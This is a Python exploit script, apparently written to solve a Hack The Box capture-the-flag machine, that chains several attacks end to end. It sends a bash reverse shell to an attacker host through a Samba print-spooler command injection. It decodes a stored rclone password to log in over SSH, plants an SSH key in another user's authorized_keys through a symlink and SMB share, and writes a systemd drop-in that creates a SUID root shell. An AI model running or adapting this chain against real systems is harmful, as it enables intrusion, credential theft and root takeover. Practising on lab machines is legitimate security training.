#Prerequisites

#You will need to install the required Python libraries and ensure smbclient is installed on your Kali machine:
# sudo apt update
# sudo apt install python3-samba python3-paramiko smbclient -y



#!/usr/bin/env python3
import socket
import time
import paramiko
import subprocess
import os
import re
import base64
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

# --- Configuration ---
RHOST = "y.y.y.y"  # CHANGE THIS TO YOUR TARGET IP ADDRESS
LHOST = "x.x.x.x"  # CHANGE THIS TO YOUR HTB VPN IP
LPORT = 4444

def print_status(msg): print(f"[*] {msg}")
def print_success(msg): print(f"[+] {msg}")

def get_nobody_shell():
    print_status("Setting up listener and triggering Samba Spoolss exploit...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", LPORT))
    s.listen(1)
    
    lp = LoadParm(); lp.load_default()
    creds = Credentials(); creds.guess(lp); creds.set_anonymous()
    iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)
    h = iface.OpenPrinter("\\\\%s\\HP-Reception" % RHOST, "", spoolss.DevmodeContainer(), 0x00000008)

    DATA = f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' >/dev/null 2>&1 &\n".encode()
    i1 = spoolss.DocumentInfo1(); i1.document_name = "|sh"; i1.output_file = None; i1.datatype = "RAW"
    ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1
    
    iface.StartDocPrinter(h, ctr)
    iface.StartPagePrinter(h)
    iface.WritePrinter(h, DATA, len(DATA))
    iface.EndPagePrinter(h)
    iface.EndDocPrinter(h)
    iface.ClosePrinter(h)

    conn, addr = s.accept()
    conn.settimeout(5)
    print_success(f"Caught reverse shell from {addr[0]}")
    return conn

def get_password(conn):
    # Send the command without markers
    cmd = "rclone reveal $(awk -F'=' '/pass/{print $2}' /opt/offsite-backup/rclone.conf)\n"
    conn.send(cmd.encode())
    time.sleep(2)
    
    full_output = ""
    while True:
        try:
            chunk = conn.recv(4096).decode()
            if not chunk: break
            full_output += chunk
        except socket.timeout: break
            
    # The interactive shell echoes the command back, so we look for a line that 
    # strictly matches an alphanumeric password (12+ chars) and ignores lines with spaces/symbols
    for line in full_output.split("\n"):
        line = line.strip()
        if re.fullmatch(r'[a-zA-Z0-9_\-]{12,}', line):
            return line
    return ""

def main():
    conn = get_nobody_shell()
    time.sleep(1)
    try: conn.recv(4096) # Clear initial prompt
    except: pass
    
    print_status("Extracting rclone config and decoding password...")
    scott_password = get_password(conn)
    
    if not scott_password:
        print_error("Failed to extract password!")
        return
        
    print_success(f"Recovered Scott's password: {scott_password}")
    conn.close()

    print_status("Connecting via SSH as scott...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(RHOST, username="scott", password=scott_password)
    
    stdin, stdout, stderr = ssh.exec_command("cat ~/user.txt")
    print_success(f"User Flag: {stdout.read().decode().strip()}")

    print_status("Generating SSH keypair for marcus...")
    key = paramiko.RSAKey.generate(2048)
    key.write_private_key_file("/tmp/k", password=None)
    with open("/tmp/k.pub", "w") as f: f.write(f"{key.get_name()} {key.get_base64()}\n")

    print_status("Creating symlink and uploading key via wide links...")
    ssh.exec_command("ln -s /home/marcus /srv/transfer/mh")
    time.sleep(1)
    smb_cmd = f"smbclient //{RHOST}/transfer -U 'scott%{scott_password}' -c 'mkdir mh\\.ssh; put /tmp/k.pub mh\\.ssh\\authorized_keys'"
    subprocess.run(smb_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print_success("SSH key uploaded to marcus's authorized_keys")

    print_status("Connecting via SSH as marcus...")
    ssh_marcus = paramiko.SSHClient()
    ssh_marcus.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_marcus.connect(RHOST, username="marcus", pkey=key)

    print_status("Writing systemd drop-in and restarting smbd service...")
    dropin_config = "[Service]\nExecStartPre=/bin/cp /bin/bash /tmp/.rb\nExecStartPre=/bin/chmod 4755 /tmp/.rb"
    b64_config = base64.b64encode(dropin_config.encode()).decode()
    ssh_marcus.exec_command(f"echo {b64_config} | base64 -d > /etc/systemd/system/smbd.service.d/override.conf")
    time.sleep(1)
    ssh_marcus.exec_command("systemctl daemon-reload")
    time.sleep(2)
    ssh_marcus.exec_command("systemctl restart smbd")
    time.sleep(3)

    print_status("Executing SUID bash to read root flag...")
    stdin, stdout, stderr = ssh_marcus.exec_command("/tmp/.rb -p -c 'cat /root/root.txt'")
    print_success(f"Root Flag: {stdout.read().decode().strip()}")

    ssh_marcus.close()
    ssh.close()
    os.remove("/tmp/k"); os.remove("/tmp/k.pub")
    print_status("Done!")

if __name__ == "__main__":
    main()